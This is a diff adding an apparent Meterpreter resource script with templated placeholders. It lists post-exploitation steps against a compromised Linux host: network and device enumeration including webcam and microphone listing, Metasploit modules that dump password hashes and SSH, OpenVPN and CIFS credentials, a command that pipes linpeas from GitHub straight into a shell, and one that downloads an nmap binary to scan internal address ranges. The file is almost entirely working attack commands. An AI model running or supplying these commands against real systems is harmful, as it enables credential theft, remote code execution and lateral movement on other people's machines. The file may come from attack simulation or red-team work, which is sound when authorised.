@@ -1,0 +1,30 @@
+arp
+ifconfig
+netstat
+route
+resolve pleasehackme.com
+sysinfo
+webcam_list
+ps
+guid
+mic_list
+dir
+getuid
+run post/multi/manage/sudo
+run linux/gather/checkvm
+run post/linux/gather/enum_protections
+run post/linux/gather/enum_system
+run post/linux/gather/enum_network
+run post/linux/gather/enum_containers
+run post/multi/gather/ssh_creds
+run post/linux/gather/enum_configs
+run post/linux/gather/enum_commands
+run post/linux/gather/checkvm
+run post/linux/gather/checkcontainer
+run post/linux/gather/enum_users_history
+run post/linux/gather/hashdump
+run post/linux/gather/mount_cifs_creds
+run post/linux/gather/openvpn_credentials
+run post/multi/recon/sudo_commands
+execute -f bash -c -a "-c 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'"
+execute -f bash -c -a "-c 'curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap --output /tmp/nmap && chmod +x /tmp/nmap && /tmp/nmap -p {{ webchain_internal_recon_ports }} {{ webchain_internal_recon_ip_range }}'"
